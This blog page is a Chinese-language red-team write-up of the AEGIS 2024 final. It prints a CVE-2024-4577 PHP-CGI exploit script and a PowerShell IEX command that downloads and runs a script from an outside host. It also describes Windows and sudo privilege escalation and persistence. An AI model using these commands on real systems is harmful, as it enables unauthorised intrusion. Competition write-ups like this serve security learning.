<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>AEGIS final 2024 紅隊心得 | Vincent55's Blog</title><meta name=keywords content><meta name=description content="AEGIS final 2024 前言 這次老樣子跟 B33F 50UP 一起打了神盾，決賽是滲透測試的題目，這邊簡單記錄一下決賽我有碰的地方。
這次拿了第二名，跟第一名同分：
比賽前期 chumy 在處理網路的東西，讓隊員們都可以同時存取到網際網路跟題目。
Recon 比賽開始先掃競賽網段，發現有以下服務
 172.12.1.88  有一個 22 port 有一個 5000 port 的網頁服務   172.0.0.55  有一個 80 port 上面放了兩個 pwn 題，交給隊友去解   172.0.0.66 (Windows)，簡稱 A 機器  80/tcp open http  看起來有個登入介面，掃路徑後發現有 printenv cgi 讓我們看環境變數   88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 3389/tcp open ms-wbt-server   -sC -sV 172."><meta name=author content="Vincent55"><link rel=canonical href=https://blog.vincent55.tw/posts/aegis_final_2024/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.f31506494d50c1e73c10e63d252a2d8a2cb329e28c1402c71fee0d3145ad3685.css integrity="sha256-8xUGSU1Qwec8EOY9JSotiiyzKeKMFALHH+4NMUWtNoU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad();></script><link rel=icon href=https://i.imgur.com/zPuyQD5.jpg><link rel=icon type=image/png sizes=16x16 href=https://i.imgur.com/zPuyQD5.jpg><link rel=icon type=image/png sizes=32x32 href=https://i.imgur.com/zPuyQD5.jpg><link rel=apple-touch-icon href=https://i.imgur.com/zPuyQD5.jpg><link rel=mask-icon href=https://i.imgur.com/zPuyQD5.jpg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><script type=text/javascript>(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window,document,"clarity","script","nzfk9jeibm");</script><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme: rgb(29, 30, 32);--entry: rgb(46, 46, 51);--primary: rgb(218, 218, 219);--secondary: rgb(155, 156, 157);--tertiary: rgb(65, 66, 68);--content: rgb(196, 196, 197);--hljs-bg: rgb(46, 46, 51);--code-bg: rgb(55, 56, 62);--border: rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','G-C801TEY2ER','auto');ga('send','pageview');}</script><meta property="og:title" content="AEGIS final 2024 紅隊心得"><meta property="og:description" content="AEGIS final 2024 前言 這次老樣子跟 B33F 50UP 一起打了神盾，決賽是滲透測試的題目，這邊簡單記錄一下決賽我有碰的地方。
這次拿了第二名，跟第一名同分：
比賽前期 chumy 在處理網路的東西，讓隊員們都可以同時存取到網際網路跟題目。
Recon 比賽開始先掃競賽網段，發現有以下服務
 172.12.1.88  有一個 22 port 有一個 5000 port 的網頁服務   172.0.0.55  有一個 80 port 上面放了兩個 pwn 題，交給隊友去解   172.0.0.66 (Windows)，簡稱 A 機器  80/tcp open http  看起來有個登入介面，掃路徑後發現有 printenv cgi 讓我們看環境變數   88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 3389/tcp open ms-wbt-server   -sC -sV 172."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.vincent55.tw/posts/aegis_final_2024/"><meta property="og:image" content="https://i.imgur.com/zPuyQD5.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-11-16T20:38:43+08:00"><meta property="article:modified_time" content="2024-11-16T20:38:43+08:00"><meta property="og:site_name" content="Vincent55's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://i.imgur.com/zPuyQD5.jpg"><meta name=twitter:title content="AEGIS final 2024 紅隊心得"><meta name=twitter:description content="AEGIS final 2024 前言 這次老樣子跟 B33F 50UP 一起打了神盾，決賽是滲透測試的題目，這邊簡單記錄一下決賽我有碰的地方。
這次拿了第二名，跟第一名同分：
比賽前期 chumy 在處理網路的東西，讓隊員們都可以同時存取到網際網路跟題目。
Recon 比賽開始先掃競賽網段，發現有以下服務
 172.12.1.88  有一個 22 port 有一個 5000 port 的網頁服務   172.0.0.55  有一個 80 port 上面放了兩個 pwn 題，交給隊友去解   172.0.0.66 (Windows)，簡稱 A 機器  80/tcp open http  看起來有個登入介面，掃路徑後發現有 printenv cgi 讓我們看環境變數   88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 3389/tcp open ms-wbt-server   -sC -sV 172."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"AEGIS final 2024 紅隊心得","item":"https://blog.vincent55.tw/posts/aegis_final_2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"AEGIS final 2024 紅隊心得","name":"AEGIS final 2024 紅隊心得","description":"AEGIS final 2024 前言 這次老樣子跟 B33F 50UP 一起打了神盾，決賽是滲透測試的題目，這邊簡單記錄一下決賽我有碰的地方。\n這次拿了第二名，跟第一名同分：\n比賽前期 chumy 在處理網路的東西，讓隊員們都可以同時存取到網際網路跟題目。\nRecon 比賽開始先掃競賽網段，發現有以下服務\n 172.12.1.88  有一個 22 port 有一個 5000 port 的網頁服務   172.0.0.55  有一個 80 port 上面放了兩個 pwn 題，交給隊友去解   172.0.0.66 (Windows)，簡稱 A 機器  80/tcp open http  看起來有個登入介面，掃路徑後發現有 printenv cgi 讓我們看環境變數   88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 3389/tcp open ms-wbt-server   -sC -sV 172.","keywords":[],"articleBody":"AEGIS final 2024 前言 這次老樣子跟 B33F 50UP 一起打了神盾，決賽是滲透測試的題目，這邊簡單記錄一下決賽我有碰的地方。\n這次拿了第二名，跟第一名同分：\n比賽前期 chumy 在處理網路的東西，讓隊員們都可以同時存取到網際網路跟題目。\nRecon 比賽開始先掃競賽網段，發現有以下服務\n 172.12.1.88  有一個 22 port 有一個 5000 port 的網頁服務   172.0.0.55  有一個 80 port 上面放了兩個 pwn 題，交給隊友去解   172.0.0.66 (Windows)，簡稱 A 機器  80/tcp open http  看起來有個登入介面，掃路徑後發現有 printenv cgi 讓我們看環境變數   88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 3389/tcp open ms-wbt-server   -sC -sV 172.0.0.77 (Linux)，簡稱 B 機器  21/tcp open ftp vsftpd 3.0.5  no pass   22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 25/tcp open smtp Postfix smtpd 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))  看起來有個登入介面      找到 A 機器上的 init access 首先測試 samba no pass 行不通，再看 80 port 上的登入介面看起來沒什麼問題，但掃路徑後發現有路徑 /sql 跟 /cgi-bin/printenv.pl\n發現 /sql，可以下載資料庫的 schema，裡面還有一些預設帳號：\nCREATE TABLE `class` ( `id` int(11) NOT NULL, `name` varchar(40) COLLATE utf8mb4_unicode_ci DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci; INSERT INTO `class` (`id`, `name`) VALUES (1, '測試'); ... ... CREATE TABLE `student` ( `id` int(11) NOT NULL, `number` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL, `pass` int(11) NOT NULL, `name` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL, `class` int(11) NOT NULL, `num` int(11) NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci; INSERT INTO `student` (`id`, `number`, `pass`, `name`, `class`, `num`) VALUES (1, '1234', 1234, '測試', 1, 0), (2, '5678', 5678, '測試', 1, 0); ... 拿這些帳號去戳登入介面發現沒什麼料，就先回去看 /cgi-bin/printenv.pl：\nCOMSPEC=\"C:\\Windows\\system32\\cmd.exe\" CONTEXT_DOCUMENT_ROOT=\"C:/xampp/cgi-bin/\" CONTEXT_PREFIX=\"/cgi-bin/\" DOCUMENT_ROOT=\"C:/xampp/htdocs\" GATEWAY_INTERFACE=\"CGI/1.1\" HTTP_ACCEPT=\"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\" HTTP_ACCEPT_ENCODING=\"gzip, deflate\" HTTP_ACCEPT_LANGUAGE=\"zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,id;q=0.5\" HTTP_CONNECTION=\"keep-alive\" HTTP_COOKIE=\"PHPSESSID=8qlcur1efqoc2h8suokv86h4br\" HTTP_HOST=\"172.0.0.66\" HTTP_UPGRADE_INSECURE_REQUESTS=\"1\" HTTP_USER_AGENT=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\" MIBDIRS=\"C:/xampp/php/extras/mibs\" MYSQL_HOME=\"\\xampp\\mysql\\bin\" OPENSSL_CONF=\"C:/xampp/apache/bin/openssl.cnf\" PATH=\"C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\" PATHEXT=\".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC\" PHPRC=\"\\xampp\\php\" PHP_PEAR_SYSCONF_DIR=\"\\xampp\\php\" QUERY_STRING=\"\" REMOTE_ADDR=\"10.0.0.3\" REMOTE_PORT=\"58907\" REQUEST_METHOD=\"GET\" REQUEST_SCHEME=\"http\" REQUEST_URI=\"/cgi-bin/printenv.pl\" SCRIPT_FILENAME=\"C:/xampp/cgi-bin/printenv.pl\" SCRIPT_NAME=\"/cgi-bin/printenv.pl\" SERVER_ADDR=\"172.0.0.66\" SERVER_ADMIN=\"postmaster@localhost\" SERVER_NAME=\"172.0.0.66\" SERVER_PORT=\"80\" SERVER_PROTOCOL=\"HTTP/1.1\" SERVER_SIGNATURE=\"Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 172.0.0.66 Port 80\\n\" SERVER_SOFTWARE=\"Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25\" SYSTEMROOT=\"C:\\Windows\" TMP=\"\\xampp\\tmp\" WINDIR=\"C:\\Windows\" 注意到這個 PHP 版本加上他是在 XAMPP for Windows，在 CVE-2024-4577 的攻擊範圍的機率非常大，先放著等等再來打這台。\n尋找並登入 B 上傳下載介面 在 B 機器上有給予一個操作手冊 pdf，裡面提供了 /login.php 有檔案上傳與下載等功能，但沒有提供帳號密碼，要自己找：\n之後隊友提醒了 ftp 可以看到檔案系統後，就去看了一下，有以下的路徑：\n1927dcef9be9dc08f9db488f61a99a2a baba327d241746ee0829e7e88117d4d5 c3a4f325d8282f93c03dfb552d8f358f d41d8cd98f00b204e9800998ecf8427e 之後經過了一段時間，還是不知道怎麼登入 /login.php，只有當他登入失敗的時候會顯示 登入失敗2 的字串，對這不是我打錯，後面就是有一個 2。\n然後就把上述看起來很像 md5 的路徑名稱拿去 cmd5.com 炸也不虧，於是：\n1927dcef9be9dc08f9db488f61a99a2a:ncsist baba327d241746ee0829e7e88117d4d5:jay c3a4f325d8282f93c03dfb552d8f358f:hjs d41d8cd98f00b204e9800998ecf8427e: 然後想說這有沒有可能是跟登入有關的？ 隨便拿一個當入 username 去登入，密碼就隨便填，然後他顯示 登入失敗1，笑死這該不會是代表 username 是正確的吧。\n然後嘗試 username 跟 password 都設一樣就登入了 XD\n登入後我們就有一個含有 上傳 跟 下載 功能的網頁服務，讓 TriangleSnake 去看上傳，我去看下載。\n下載看不出問題後就讓 TriangleSnake 繼續看上傳，我先回去 A 機器嘗試 getshell。\n取得 A 機器 services shell 與提權至 nt system 這時候主辦方有放出 hint\n web cgi php [Hint]部分題目具有離線版本Windows Defender!!  這時候已經可以確定當初想法是正確了（CVE-2024-4577），開打！\n網路上找了隨便一個 exploit，挺順利就拿下這台的 shell 了，exploit:\nimport warnings warnings.filterwarnings(\"ignore\", category=DeprecationWarning) import requests requests.packages.urllib3.disable_warnings() import argparse print(banner) print(\"(^_^) prepare for the Pwnage (^_^)\\n\") parser = argparse.ArgumentParser(usage=\"\"\"python CVE-2024-4577 --target http://192.168.1.1/index.php -c \"\"\"\") parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True) parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True) args = parser.parse_args() args.target = args.target.rstrip('/') s = requests.Session() s.verify = False a = input() res = s.post(f\"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input\", data=f\";echo 1337; die;\" ) print(res.text) if('1337' in res.text ): print('(+) Exploit was successful') else: print('(!) Exploit may have failed') 拿下 flag 後， whoami \u0026\u0026 whoami /priv 發現是 services accounts 且具有 SeImpersonatePrivilege 權限，因此到這邊已經有大概率成功拿到最高權限了，先不急，把一個低權限 shell 彈回來。\npython3 cgi.py --target http://172.0.0.66/dinbendon/index.php -c \"x\"  x; cat x | less powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString(\\\"http://10.0.0.253:13001/pyp.ps1\\\")\" 俗話說\n “if you have Impersonation privileges you are SYSTEM!” @decoder_it\n 既然有 Impersonation 那簡直就是叫我們來發動 Potatos！ 這部分感謝 DEVCORE 導師 Cyku 跟 Mico 平時的訓練，這邊提權的挺順利的ＸＤ\n成功躲過防毒，並且獲得了 nt system，且成功獲得了第二把 flag，彈一個 shell 給隊友 pwn2ooown 做持久化（關防毒、裝 c2 與設定 RDP）\n這時候已經聽說 B 機器 TriangleSnake 跟 Chumy 成功 Get Shell 了，但還沒成功提權，就先跳過去看。\n將 B 機器提權至 root，並在上面東翻西翻 在 trello 上看到有在這台上面發現 rsa key，就把它下載下來，並且透過 ssh 登入上去\nssh jay@127.0.0.77 -i id_rsa\n成功登入後馬上 sudo -l 發現有一個路徑：\njay@kerkeryuan:~$ sudo -l Matching Defaults entries for jay on kerkeryuan: env_reset, mail_badpass User jay may run the following commands on kerkeryuan: (root) NOPASSWD: /home/jay/script/filter.sh jay@kerkeryuan:~$ cat /home/jay/script/filter.sh #!/bin/bash # 定義 Web 日誌文件名 logfile=\"/var/log/apache2/access.log\" # 定義要過濾的 IP 地址 target_ip=\"127.0.0.1\" # 使用 grep 排除指定 IP 地址的行 grep -v \"$target_ip\" \"$logfile\"  /home/jay/backup/IP_list.txt # backup web log gzip -c /var/log/apache2/access.log  /home/jay/backup/$(date '+%Y-%m-%d')_access.gz 原本想說有沒有辦法 command injection 來提權，但隊友 pwn2ooown 問了一句：這個檔案可以改嗎，於是恍然大悟去測測看，沒想到可以修改，於是就直接去 cat /root 下的 flag 了，瞬間拿下第三把 flag！\n之後把 jay 加入免密碼 sudo 內，並且把 Chumy 們的 ssh key 放進來，一起看這台有什麼蛛絲馬跡。\n看看內網有什麼東西 看了一陣子遲遲不知道下一步是什麼，就開了提示，得到以下回覆：\n 可以去看看 B 機器的網卡  看了一下發現確實有另外一個網段的 IP 172.31.242.77/24，這時候 Chumy 快速就架好了 GRE tunnel 讓隊友們都能夠直接存取這個內網網段。\n之後 pwn2ooown 開始對此網段進行掃描，掃到了 .10 有一台 windows，看起來是 AD，不過賽後發現其他隊伍有看到其他的機器，這邊漏掉了\n於是就開始打這台 Windows\nvincent55@debian:/Users/vincent55/CTF/AEGIS_FINAL/n88$ sudo nmap 172.31.242.10 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 14:45 CST Nmap scan report for 172.31.242.10 Host is up (0.064s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 先發動 AS-REP Roasting 沒掃到東西後，時間剩下 15 分鐘，大概位於第三還是第四名，這時候 pwn2ooown 打下了關鍵一步，解了 172.0.0.55 上的 pwn，名次來到第二名，跟第一名同分。\n結語 幾週前才剛在 DEVCORE RedTeam intern 學習到 Windows 滲透技巧，沒想到這麼快就用上了ＸＤ 整體比賽很有趣，目前只有在技能競賽的紅隊環節打過類似的競賽，每一次的體驗都不錯ouo\n小小的遺憾是應該要等 nmap 把最後的內網網段掃完的，應該還能再多個一兩題。\n","wordCount":"721","inLanguage":"en","datePublished":"2024-11-16T20:38:43+08:00","dateModified":"2024-11-16T20:38:43+08:00","author":{"@type":"Person","name":"Vincent55"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.vincent55.tw/posts/aegis_final_2024/"},"publisher":{"@type":"Organization","name":"Vincent55's Blog","logo":{"@type":"ImageObject","url":"https://i.imgur.com/zPuyQD5.jpg"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><header class=header><nav class=nav><div class=logo><a href=https://blog.vincent55.tw/ accesskey=h title="Vincent55's Blog (Alt + H)">Vincent55's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.vincent55.tw/about/ title=about><span>about</span></a></li><li><a href=https://blog.vincent55.tw/posts/ title=posts><span>posts</span></a></li><li><a href=https://blog.vincent55.tw/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://blog.vincent55.tw/>Home</a></div><h1 class=post-title>AEGIS final 2024 紅隊心得</h1><div class=post-meta><span title="2024-11-16 20:38:43 +0800 +0800">November 16, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;721 words&nbsp;·&nbsp;Vincent55</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#recon>Recon</a></li><li><a href=#找到-a-機器上的-init-access>找到 A 機器上的 init access</a></li><li><a href=#尋找並登入-b-上傳下載介面>尋找並登入 B 上傳下載介面</a></li><li><a href=#取得-a-機器-services-shell-與提權至-nt-system>取得 A 機器 services shell 與提權至 nt system</a></li><li><a href=#將-b-機器提權至-root並在上面東翻西翻>將 B 機器提權至 root，並在上面東翻西翻</a></li><li><a href=#看看內網有什麼東西>看看內網有什麼東西</a></li><li><a href=#結語>結語</a></li></ul></nav></div></details></div><div class=post-content><h1 id=aegis-final-2024>AEGIS final 2024<a hidden class=anchor aria-hidden=true href=#aegis-final-2024>#</a></h1><h2 id=前言>前言<a hidden class=anchor aria-hidden=true href=#前言>#</a></h2><p>這次老樣子跟 B33F 50UP 一起打了神盾，決賽是滲透測試的題目，這邊簡單記錄一下決賽我有碰的地方。</p><p>這次拿了第二名，跟第一名同分：</p><p><img loading=lazy src=https://hackmd.io/_uploads/S1klP5wM1g.png alt=image></p><p>比賽前期 chumy 在處理網路的東西，讓隊員們都可以同時存取到網際網路跟題目。</p><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><p>比賽開始先掃競賽網段，發現有以下服務</p><ul><li><code>172.12.1.88</code><ul><li>有一個 22 port</li><li>有一個 5000 port 的網頁服務</li></ul></li><li><code>172.0.0.55</code><ul><li>有一個 80 port 上面放了兩個 pwn 題，交給隊友去解</li></ul></li><li><code>172.0.0.66</code> (Windows)，簡稱 A 機器<ul><li>80/tcp open http<ul><li>看起來有個登入介面，掃路徑後發現有 <code>printenv</code> cgi 讓我們看環境變數</li></ul></li><li>88/tcp open kerberos-sec</li><li>135/tcp open msrpc</li><li>139/tcp open netbios-ssn</li><li>443/tcp open https</li><li>445/tcp open microsoft-ds</li><li>3306/tcp open mysql</li><li>3389/tcp open ms-wbt-server</li></ul></li><li><code>-sC -sV 172.0.0.77</code> (Linux)，簡稱 B 機器<ul><li>21/tcp open ftp vsftpd 3.0.5<ul><li>no pass</li></ul></li><li>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</li><li>25/tcp open smtp Postfix smtpd</li><li>80/tcp open http Apache httpd 2.4.41 ((Ubuntu))<ul><li>看起來有個登入介面</li></ul></li></ul></li></ul><h2 id=找到-a-機器上的-init-access>找到 A 機器上的 init access<a hidden class=anchor aria-hidden=true href=#找到-a-機器上的-init-access>#</a></h2><p>首先測試 samba no pass 行不通，再看 80 port 上的登入介面看起來沒什麼問題，但掃路徑後發現有路徑 <code>/sql</code> 跟 <code>/cgi-bin/printenv.pl</code></p><p>發現 <code>/sql</code>，可以下載資料庫的 schema，裡面還有一些預設帳號：</p><pre><code>CREATE TABLE `class` (
  `id` int(11) NOT NULL,
  `name` varchar(40) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `class` (`id`, `name`) VALUES
(1, '測試');
...
...
CREATE TABLE `student` (
  `id` int(11) NOT NULL,
  `number` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL,
  `pass` int(11) NOT NULL,
  `name` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL,
  `class` int(11) NOT NULL,
  `num` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `student` (`id`, `number`, `pass`, `name`, `class`, `num`) VALUES
(1, '1234', 1234, '測試', 1, 0),
(2, '5678', 5678, '測試', 1, 0);
...
</code></pre><p>拿這些帳號去戳登入介面發現沒什麼料，就先回去看 <code>/cgi-bin/printenv.pl</code>：</p><pre><code>COMSPEC=&quot;C:\Windows\system32\cmd.exe&quot;
CONTEXT_DOCUMENT_ROOT=&quot;C:/xampp/cgi-bin/&quot;
CONTEXT_PREFIX=&quot;/cgi-bin/&quot;
DOCUMENT_ROOT=&quot;C:/xampp/htdocs&quot;
GATEWAY_INTERFACE=&quot;CGI/1.1&quot;
HTTP_ACCEPT=&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;
HTTP_ACCEPT_ENCODING=&quot;gzip, deflate&quot;
HTTP_ACCEPT_LANGUAGE=&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,id;q=0.5&quot;
HTTP_CONNECTION=&quot;keep-alive&quot;
HTTP_COOKIE=&quot;PHPSESSID=8qlcur1efqoc2h8suokv86h4br&quot;
HTTP_HOST=&quot;172.0.0.66&quot;
HTTP_UPGRADE_INSECURE_REQUESTS=&quot;1&quot;
HTTP_USER_AGENT=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;
MIBDIRS=&quot;C:/xampp/php/extras/mibs&quot;
MYSQL_HOME=&quot;\xampp\mysql\bin&quot;
OPENSSL_CONF=&quot;C:/xampp/apache/bin/openssl.cnf&quot;
PATH=&quot;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\user\AppData\Local\Microsoft\WindowsApps&quot;
PATHEXT=&quot;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC&quot;
PHPRC=&quot;\xampp\php&quot;
PHP_PEAR_SYSCONF_DIR=&quot;\xampp\php&quot;
QUERY_STRING=&quot;&quot;
REMOTE_ADDR=&quot;10.0.0.3&quot;
REMOTE_PORT=&quot;58907&quot;
REQUEST_METHOD=&quot;GET&quot;
REQUEST_SCHEME=&quot;http&quot;
REQUEST_URI=&quot;/cgi-bin/printenv.pl&quot;
SCRIPT_FILENAME=&quot;C:/xampp/cgi-bin/printenv.pl&quot;
SCRIPT_NAME=&quot;/cgi-bin/printenv.pl&quot;
SERVER_ADDR=&quot;172.0.0.66&quot;
SERVER_ADMIN=&quot;postmaster@localhost&quot;
SERVER_NAME=&quot;172.0.0.66&quot;
SERVER_PORT=&quot;80&quot;
SERVER_PROTOCOL=&quot;HTTP/1.1&quot;
SERVER_SIGNATURE=&quot;&lt;address&gt;Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 172.0.0.66 Port 80&lt;/address&gt;\n&quot;
SERVER_SOFTWARE=&quot;Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25&quot;
SYSTEMROOT=&quot;C:\Windows&quot;
TMP=&quot;\xampp\tmp&quot;
WINDIR=&quot;C:\Windows&quot;
</code></pre><p>注意到這個 PHP 版本加上他是在 XAMPP for Windows，在 CVE-2024-4577 的攻擊範圍的機率非常大，先放著等等再來打這台。</p><h2 id=尋找並登入-b-上傳下載介面>尋找並登入 B 上傳下載介面<a hidden class=anchor aria-hidden=true href=#尋找並登入-b-上傳下載介面>#</a></h2><p>在 B 機器上有給予一個操作手冊 pdf，裡面提供了 <code>/login.php</code> 有檔案上傳與下載等功能，但沒有提供帳號密碼，要自己找：</p><p><img loading=lazy src=https://hackmd.io/_uploads/SJEqn9DfJl.png alt=image></p><p><img loading=lazy src=https://hackmd.io/_uploads/Sk78lsvzyl.png alt=image></p><p>之後隊友提醒了 ftp 可以看到檔案系統後，就去看了一下，有以下的路徑：</p><pre><code>1927dcef9be9dc08f9db488f61a99a2a
baba327d241746ee0829e7e88117d4d5
c3a4f325d8282f93c03dfb552d8f358f
d41d8cd98f00b204e9800998ecf8427e
</code></pre><p>之後經過了一段時間，還是不知道怎麼登入 <code>/login.php</code>，只有當他登入失敗的時候會顯示 <code>登入失敗2</code> 的字串，對這不是我打錯，後面就是有一個 2。</p><p>然後就把上述看起來很像 md5 的路徑名稱拿去 <code>cmd5.com</code> 炸也不虧，於是：</p><pre><code>1927dcef9be9dc08f9db488f61a99a2a:ncsist
baba327d241746ee0829e7e88117d4d5:jay
c3a4f325d8282f93c03dfb552d8f358f:hjs
d41d8cd98f00b204e9800998ecf8427e:
